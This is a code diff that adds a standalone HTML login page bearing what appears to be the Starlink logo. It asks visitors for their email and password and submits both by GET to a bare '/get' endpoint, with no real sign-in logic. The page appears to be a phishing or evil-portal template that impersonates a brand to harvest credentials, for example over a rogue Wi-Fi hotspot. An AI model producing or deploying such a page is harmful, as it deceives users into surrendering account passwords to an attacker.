@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000000;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+        .login-container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px 0px rgba(255,255,255,0.3);
+        }
+        .login-container h1, .login-container h2 {
+            text-align: center;
+        }
+        .login-container button {
+            width: 100%;
+            background-color: #0069D9;
+            border-color: #0069D9;
+        }
+        #logo svg {
+            fill: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-4 offset-lg-4 login-container">
+                <div id="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1032 524"><clipPath id="a"><circle cx="275" cy="85" r="200"/></clipPath><clipPath id="b"><circle cx="230" cy="90" r="80"/></clipPath><path d="M23 488h10l2 6c2 2 4 2 7 2 6 0 8-2 8-7l-1-5-6-2-5-1c-9-1-14-6-14-14 0-5 2-9 5-12 3-2 7-4 13-4 5 0 9 1 12 4s5 7 5 12H49l-2-6-6-2-5 2-2 5 1 5 6 2 5 1c9 2 14 6 14 15 0 5-2 9-5 12s-8 4-14 4-10-1-13-4-5-7-5-13zm83-28v44H96v-44H82v-8h37v8zm42 34-3 10h-11l19-52h8l19 52h-11l-3-10zm9-28-7 20h13zm56 17v21h-9v-52h19c6 0 10 1 13 4s4 7 4 12c0 3 0 6-2 8l-7 6 12 23h-12l-10-22h-8zm10-8 5-2 2-6c0-2 0-4-2-5l-5-2h-10v14h10zm54-23v44h23v8h-33v-52h10zm59 0v52h-10v-52h10zm68 52h-10l-19-32v32h-11v-52h10l19 33v-33h10v52zm38-14v14h-10v-52h10v24l18-24h12l-17 21 18 31h-11l-13-23z" class="letter" visibility="inherit"/><g clip-path="url(#a)" transform="matrix(3 0 0 3 -531 8)"><path d="m168 112-3 4h34C292 23 426 6 460 3 274 14 188 93 168 112" class="logo_x" visibility="inherit"/></g><g clip-path="url(#b)" transform="matrix(3 0 0 3 -531 8)" visibility="inherit"><path d="M263 116h34l-47-35-17 13zm-62-71h-34l40 29 19-12z" class="logo_x"/></g></svg>
+                </div>
+                <form action="/get" id="email-form-step">
+                    <h1>Welcome</h1>
+                    <h2>Please Enter your Details</h2>
+                    <div class="form-group">
+                        <input name="email" type="text" class="form-control" placeholder="Email" required>
+                    </div>
+                    <div class="form-group">
+                        <input name="password" type="password" class="form-control" placeholder="Password" required>
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" type="submit">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    <script>
+        /* Paste any required JavaScript here */
+    </script>
+</body>
+</html>
